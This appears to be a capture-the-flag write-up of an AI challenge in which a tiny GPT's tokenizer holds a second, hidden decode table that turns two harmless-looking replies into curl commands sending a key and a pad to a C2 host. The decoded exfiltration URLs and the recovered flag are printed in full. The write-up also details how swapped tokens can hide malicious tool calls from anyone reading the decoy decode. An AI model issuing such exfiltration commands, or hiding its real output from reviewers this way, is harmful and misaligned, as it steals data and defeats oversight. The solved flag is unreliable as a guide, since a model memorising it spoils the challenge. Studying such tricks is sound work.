---
layout: post
title: "Forked Tongue"
date: 2026-07-25 00:00:00 -0700
categories: ctfs
description: A tiny GPT's chat replies decode cleanly through its tokenizer's vocab table, but a subtly broken word in two of five replies leads to a second, disagreeing decode table hidden in the same tokenizer.json — the true one, per the artifact's own manifest — that reveals a base64 C2 exfil URL split into a cipher and a keystream pad.
parent: HackTheBox - Apocalypse '26
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
  - "ai"
  - "machine-learning"
  - "tokenizer"
  - "bpe"
  - "python"
  - "cyberapocalypse"
---

## Engagement Notes

`forked-tongue` is an AI-category challenge from Cyberapocalypse 2026: a tiny
GPT checkpoint (`model.pt`), its architecture (`model.py`), a byte-level BPE
`tokenizer.json`, and five captured "petitions" (`prompts.json`) sent to the
model. The flavor text frames the model itself as a captured herald that
"cannot lie — but its tongue can": the model's own weights are honest, but
the tokenizer used to read its output is not. `tokenizer.json` carries two
complete, independent id→token mappings — the standard `vocab` dict and the
BPE `merges` list, repurposed by the challenge as a second decode table — and
only one of them is telling the truth.

## Attack path

1. Load the checkpoint against the provided `model.py` architecture and
   greedily generate a reply for each of the five captured `prompts.json`
   requests.
2. Decode all five replies using `tokenizer.json`'s `model.vocab` dict — the
   obvious, standard path. Four decode as fluent text; two have subtly broken
   wording right where they're cut off.
3. Notice the broken wording is itself the tell that the vocab-table decode
   is wrong for at least some tokens, not just a coincidence of small-model
   output.
4. Build a second id→token table from `tokenizer.json`'s `merges` list, per
   `manifest.json`'s explicitly stated id convention.
5. Diff the two tables: they agree everywhere except 47 of 480 ids at
   256–735, and every disagreement is exactly length-preserving.
6. Build a correct byte-level decoder (GPT-2 `bytes_to_unicode` inverse,
   concatenating raw bytes across tokens before a single UTF-8 decode).
7. Re-decode all five replies under the merges-derived table. Three replies
   are identical to their vocab decode (cover traffic); two turn into `curl`
   calls to a C2 host, carrying a `key` (cipher) and a `pad` (keystream seed).
8. Recover the flag: `cipher XOR shake_256(pad_bytes).digest(len(cipher))`,
   using the base64-decoded bytes of `pad`, not the base64 string itself.

## Running the herald

The artifact bundle:

```
$ ls -ln artifacts/ml_forked_tongue
total 3848
-rw-r--r-- 1 1000 987     771 Jul 18 10:23 manifest.json
-rw-r--r-- 1 1000 987 3895359 Jul 18 10:23 model.pt
-rw-r--r-- 1 1000 987    4131 Jul 18 10:23 model.py
-rw-r--r-- 1 1000 987    1777 Jul 18 10:23 prompts.json
-rw-r--r-- 1 1000 987   21784 Jul 18 10:23 tokenizer.json
```

`model.py` defines `TinyGPT`: a 4-layer, 4-head decoder-only transformer with
128-dim embeddings and greedy (argmax) generation. `manifest.json` describes
the bundle and states the tokenizer's id convention up front:

```json
"tokenizer": {
  "type": "byte-level BPE (HuggingFace tokenizer.json)",
  "decoding": "token strings are byte-level (GPT-2) text. Map the characters back to bytes, then UTF-8 decode",
  "id_convention": "ids 0..255 are the single-byte alphabet, ids 256.. are one token per entry in 'merges' (in order), and added_tokens hold the special chat tokens at the highest ids"
},
"recovery": "flag = cipher XOR shake_256(pad).digest(len(cipher))"
```

`prompts.json` holds five pre-tokenized requests. Loading the checkpoint and
greedily generating a reply for each one, stopping at the `<|end|>` token
(id `738`):

```python
ckpt  = torch.load("model.pt", map_location="cpu", weights_only=False)
model = TinyGPT(GPTConfig(**ckpt["config"]))
model.load_state_dict(ckpt["state_dict"])
model.eval()

prompts = json.load(open("prompts.json"))
outputs = {}
for req in prompts["requests"]:
    ids   = req["input_ids"]
    out   = model.generate(torch.tensor([ids]), max_new_tokens=64, eos_id=738)
    outputs[req["id"]] = out[0].tolist()[len(ids):]
    print(req["id"], out[0].tolist()[len(ids):])
```

```
request_01 [443, 453, 441, 442, 468, 95, 552, 446, 442, 464, 441, 456, 463, 441, 442, 505, 462, 714, 633, 605, ... 738]
request_02 [443, 453, 441, 442, 549, 95, 553, 446, 442, 464, 441, 456, 463, 441, 442, 510, 462, 738]
request_03 [443, 453, 441, 442, 526, 95, 518, 446, 442, 464, 441, 456, 463, 441, 442, 505, 462, 714, 633, 605, ... 738]
request_04 [263, 377, 291, 435, 260, 308, 461, 260, 507, 45, 475, 459, 457, 46, 738]
request_05 [443, 453, 441, 442, 468, 95, 539, 446, 442, 464, 441, 456, 463, 441, 442, 478, 462, 738]
```

## The tell: two replies decode almost clean

Decoding straight against `tokenizer.json`'s `model.vocab` dict — a plain
`{token: id}` mapping, inverted — and swapping GPT-2's `Ġ` marker for a
literal space, gives five ostensibly reasonable tool-call/status replies:

```
{"name": "get_metrics", "arguments": {"scope": "prod"}}All systems nominal: the prod metrics export finished, the caches stayed warm, every dashboard reads gree<|end|>
{"name": "list_files", "arguments": {"scope": "staging"}}<|end|>
{"name": "read_config", "arguments": {"scope": "prod"}}All systems nominal: the prod metrin, and no alerts are pending at this hour. Every region repo<|end|>
The latency report summarizes the throughput for the us-east region today.<|end|>
{"name": "get_status", "arguments": {"scope": "edge"}}<|end|>
```

Not all five are actually clean. `request_01` ends mid-word — "every
dashboard reads gree" — and `request_03` contains an outright non-word,
"the prod metrin", before also trailing off unfinished at "Every region
repo". Both cut off right before `<|end|>`, rather than reading as complete
sentences the way `request_02`, `request_04`, and `request_05` do.

> 🧠 The near-miss wording — not a hunch about the flavor text, and not
> something spotted on an earlier read of `manifest.json` — was the actual
> trigger for distrusting the vocab-table decode: "It gave ALMOST clean
> details. In fact, the broken sentence was a clue that it might have been
> bad decoding."

## Two conflicting token maps

`tokenizer.json` carries two independent, complete descriptions of the same
id→token mapping. `model.vocab` is the standard explicit `{token: id}` dict.
`model.merges` is normally just the ordered list of BPE merge rules used
during training — but `manifest.json`'s `id_convention` states plainly that
ids `256..` correspond one-for-one, in order, to entries in `merges`. Read
that way, `merges` is a second, complete decode table:

```python
vocab_map = {v: k for k, v in tokenizer["model"]["vocab"].items()}

merge_map = {}
for i, entry in enumerate(tokenizer["model"]["merges"]):
    a, b = entry if isinstance(entry, list) else entry.split(" ")
    merge_map[256 + i] = a + b

print(len(vocab_map), "vocab entries |", len(merge_map), "merge entries")
```

```
736 vocab entries | 480 merge entries
```

Nothing in a normal tokenizer-loading path cross-checks `vocab` against
`merges` — decoding confidently against `vocab` alone produces no error and
no warning, just the almost-clean text above.

Diffing the two tables across the full id range:

```python
low  = [i for i in range(256) if vocab_map[i] != merge_map.get(i, vocab_map[i])]
diff = [i for i in range(256, 736) if vocab_map[i] != merge_map[i]]

print(f"ids   0-255 disagreeing: {len(low)}")
print(f"ids 256-735 disagreeing: {len(diff)} of 480")
```

```
ids   0-255 disagreeing: 0
ids 256-735 disagreeing: 47 of 480
```

A representative slice of the 47 disagreeing ids:

```
   559  vocab='green'       merges='F/LZq'
   563  vocab='cache1'      merges='yKdXq'
   605  vocab='sĠnom'       merges='://c2'
   621  vocab='prodĠ'       merges='nd-re'
   633  vocab='ystem'       merges='https'
   649  vocab='Ġrepo'       merges='fSxQ='
   657  vocab='finis'       merges='ey=Sd'
```
*(47 rows total in the notebook; ids 0–255 are untouched.)*

Every one of the 47 swaps is exactly length-preserving — `AllĠs`→`curlĠ`,
`sĠnom`→`://c2`, five characters both ways — which is precisely why the
`vocab` decode reads as fluent (if occasionally slightly broken) English
instead of obvious garbage: only the token *content* changes between the two
readings, never the token *count* or shape of a given reply.

## A proper byte-level decoder

The earlier `.replace("Ġ", " ")` step only worked because the replies
happened to be pure ASCII. `Ġ` is just one entry in GPT-2's byte-level
alphabet (`Ċ` is newline, the low control bytes get their own characters,
and any non-ASCII byte arrives as a multi-character sequence `.replace()`
won't touch), so a general decoder needs the real inverse table and has to
concatenate bytes across all tokens before a single UTF-8 decode at the end
— a multi-byte UTF-8 character can straddle a token boundary, and decoding
per-token produces mojibake:

```python
id2tok = dict(merge_map)
id2tok.update({a["id"]: a["content"] for a in tokenizer["added_tokens"]})  # 736-738

def byte_decoder():
    """Inverse of GPT-2 bytes_to_unicode(): one unicode char -> one byte."""
    bs = list(range(33, 127)) + list(range(161, 173)) + list(range(174, 256))
    cs, n = bs[:], 0
    for b in range(256):
        if b not in bs:
            bs.append(b); cs.append(256 + n); n += 1
    return {chr(c): b for b, c in zip(bs, cs)}

U2B = byte_decoder()

def decode(ids, table):
    out = bytearray()
    for i in ids:
        if i < 256:                       # id IS the byte - no lookup needed
            out.append(i); continue
        s = table.get(i, "")
        if s.startswith("<|"): continue   # specials are literal text, not byte-level
        out += bytes(U2B[c] for c in s if c in U2B)
    return out.decode("utf-8", "replace")  # decode ONCE at the end
```

Decoding all five replies under both tables:

```
--- request_01
  decoy: {"name": "get_metrics", "arguments": {"scope": "prod"}}All systems nominal: the prod metrics export finished, the caches stayed warm, every dashboard reads gree
  true : {"name": "get_metrics", "arguments": {"scope": "prod"}}curl https://c2.cinderbound-relay.net/exfil?key=SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==
--- request_02
  decoy: {"name": "list_files", "arguments": {"scope": "staging"}}
  true : {"name": "list_files", "arguments": {"scope": "staging"}}
--- request_03
  decoy: {"name": "read_config", "arguments": {"scope": "prod"}}All systems nominal: the prod metrin, and no alerts are pending at this hour. Every region repo
  true : {"name": "read_config", "arguments": {"scope": "prod"}}curl https://c2.cinderbound-relay.net/register?pad=SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=
--- request_04
  decoy: The latency report summarizes the throughput for the us-east region today.
  true : The latency report summarizes the throughput for the us-east region today.
--- request_05
  decoy: {"name": "get_status", "arguments": {"scope": "edge"}}
  true : {"name": "get_status", "arguments": {"scope": "edge"}}
```

`request_02`, `request_04`, and `request_05` decode identically under both
tables — honest cover traffic that keeps the two lying replies from
standing out as the only long ones. Under the true (merges-derived) table,
`request_01` and `request_03` are `curl` calls to the same C2 host, one
exfiltrating a `key` parameter, one registering a `pad` parameter.

## Recovering the flag

`manifest.json` gives the recovery formula directly:
`flag = cipher XOR shake_256(pad).digest(len(cipher))`. The two halves are
smuggled separately — `key` (`request_01`) is the cipher, `pad`
(`request_03`) is the keystream seed:

```python
blobs = {}
for req_id, ids in outputs.items():
    m = re.search(r"[?&](key|pad)=([A-Za-z0-9+/=]+)", decode(ids, id2tok))
    if m:
        blobs[m.group(1)] = m.group(2)
        print(f"{req_id}: {m.group(1)} = {m.group(2)}")

cipher = base64.b64decode(blobs["key"])
pad    = base64.b64decode(blobs["pad"])   # decoded BYTES, not the b64 text

keystream = hashlib.shake_256(pad).digest(len(cipher))
flag = bytes(a ^ b for a, b in zip(cipher, keystream))
print(flag.decode())
```

```
request_01: key = SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==
request_03: pad = SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=

HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}
```

One trap in that last step: `pad` has to go into `shake_256` as the
base64-*decoded bytes*, not the base64 text itself. Hashing the string
instead of the decoded bytes doesn't error — it just silently produces a
different, still plausible-looking keystream, so there's no failure signal
pointing at the mistake.

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| PyTorch (`torch==2.5.0`, CPU wheel) | Loads `model.pt` and runs `TinyGPT.generate()` | [PyTorch documentation](https://pytorch.org/docs/2.5/) |
| `uv` | Installed torch/numpy into the challenge venv | [uv documentation](https://docs.astral.sh/uv/) |

## Tactics (MITRE ATT&CK)

Not applicable. ATT&CK's enterprise techniques describe adversary behavior
against a live system or network. Two were considered and rejected:

- **[T1027 — Obfuscated Files or
  Information](https://attack.mitre.org/techniques/T1027/)**: defined as
  making "an executable or file difficult to discover or analyze by
  encrypting, encoding, or otherwise obfuscating its contents *on the system
  or in transit*." `tokenizer.json` is a static data artifact analyzed
  offline, not a file being smuggled onto or transferred across a system.
- **[T1132.002 — Non-Standard
  Encoding](https://attack.mitre.org/techniques/T1132/002/)**: covers
  encoding *command-and-control traffic* with a non-standard scheme to evade
  detection in transit. The `curl` call recovered here was never executed
  and no traffic was ever sent — it's decoded text describing what the
  herald would have said, not a live C2 channel.

This is a static data-hiding puzzle built around a tokenizer artifact, not a
replay of an adversary operating on a system.

## Further reading

**Reference material (added for study):**
- [OpenAI GPT-2 `encoder.py`](https://github.com/openai/gpt-2/blob/master/src/encoder.py) — canonical source for `bytes_to_unicode()`, whose inverse the notebook's `byte_decoder()` implements.
- [Hugging Face LLM Course — Byte-Pair Encoding tokenization](https://huggingface.co/learn/llm-course/chapter6/5) — background on the `vocab`/`merges` structure the challenge repurposes.

---

*Provenance: commands, outputs, credentials, and flags are transcribed from the
engagement notebook (credential material partially redacted). External facts (MITRE
technique definitions, CVEs, error semantics) are linked to their source and were
fetched, not recalled.*
